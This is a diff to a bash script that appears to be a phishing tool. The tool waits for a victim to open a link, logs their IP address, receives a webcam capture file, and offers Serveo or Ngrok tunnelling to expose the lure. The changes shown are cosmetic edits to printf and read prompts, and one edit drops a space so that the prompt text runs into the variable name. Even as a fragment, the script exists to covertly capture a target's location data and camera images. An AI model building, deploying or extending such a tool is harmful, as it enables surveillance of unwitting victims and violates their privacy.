@@ -70,7 +70,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n [ + ] Target opened the link!\n"
+printf " [ + ] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -79,7 +79,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n [ + ] Cam file received! \n"
+printf " [ + ] Cam file received! \n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -187,7 +187,7 @@ printf "\n"
 printf " [  01  ]   Serveo.net \n"
 printf " [  02  ]   Ngrok \n"
 default_option_server="1"
-read -p $'\n [  +  ] Choose a Port Forwarding option:  ' option_server
+read -p $'\n [  +  ] Choose a Port Forwarding option:'option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
@@ -240,3 +240,4 @@ checkfound
 banner
 dependencies
 start1
+
